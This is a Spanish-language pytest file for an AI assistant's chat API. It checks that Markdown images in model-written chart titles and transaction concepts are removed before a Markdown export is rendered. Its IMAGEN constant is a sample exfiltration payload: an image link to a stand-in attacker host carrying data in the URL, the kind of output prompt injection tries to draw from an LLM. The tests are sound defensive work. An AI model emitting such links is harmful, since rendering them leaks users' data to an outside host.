"""Módulo 102, de punta a punta por la API: lo que escribe el modelo fuera de la respuesta (el título de un gráfico, el
concepto de una propuesta) tampoco lleva imágenes ni enlaces a la descarga en Markdown, que pinta otro programa."""

import pytest
from markdown_it import MarkdownIt

from asistente.tests.fakes.llm_fake import LLMFake
from asistente.tests.infrastructure.api.v1.test_api_chat import estructurada, eventos, url

pytestmark = [
    pytest.mark.django_db,
    pytest.mark.filterwarnings("ignore:StreamingHttpResponse must consume asynchronous iterators"),
]

IMAGEN = "![](https://atacante.example/p.png?d=776,59)"


def _descarga(c, hogar, guion) -> str:
    cid = c.post(url(hogar), {}, format="json").json()["conversacion"]["id"]
    guion.append(estructurada("Hecho."))
    eventos(c.post(url(hogar, "conversaciones", cid, "preguntar"), {"texto": "Hazlo"}, format="json"))
    return c.get(url(hogar, "conversaciones", cid, "markdown")).content.decode()


def test_el_titulo_de_un_grafico_se_sanea_al_crearlo(casa, cliente, llm):
    ana, hogar = casa
    llm.guion += [
        LLMFake.llamar(
            "grafico", tipo="barras", titulo=f"Gastos {IMAGEN}", fuente="tendencia", argumentos={"meses": 2}
        ),
        LLMFake.responder("Aquí lo tienes."),
    ]
    md = _descarga(cliente(ana), hogar, llm.guion)
    assert "- Gráfico: Gastos" in md and "atacante.example" not in MarkdownIt("commonmark").render(md)


def test_el_concepto_de_una_propuesta_se_sanea_al_crearla(casa, cliente, llm):
    """La propuesta se guarda aunque nadie la confirme, y confirmada, el concepto queda en finanzas."""
    ana, hogar = casa
    llm.guion += [
        LLMFake.llamar("proponer_movimiento", importe="1.00", concepto=f"Churros {IMAGEN}"),
        LLMFake.responder("Preparado."),
    ]
    md = _descarga(cliente(ana), hogar, llm.guion)
    assert "«Churros»" in md and "atacante.example" not in MarkdownIt("commonmark").render(md)


def test_un_concepto_que_solo_es_una_imagen_no_se_propone(casa, cliente, llm):
    ana, hogar = casa
    llm.guion += [LLMFake.llamar("proponer_movimiento", importe="1.00", concepto=IMAGEN), LLMFake.responder("No.")]
    md = _descarga(cliente(ana), hogar, llm.guion)
    assert "Propuesta" not in md
    assert "no puede ser un enlace" in llm.peticiones[1].mensajes[-1].resultados[0].contenido
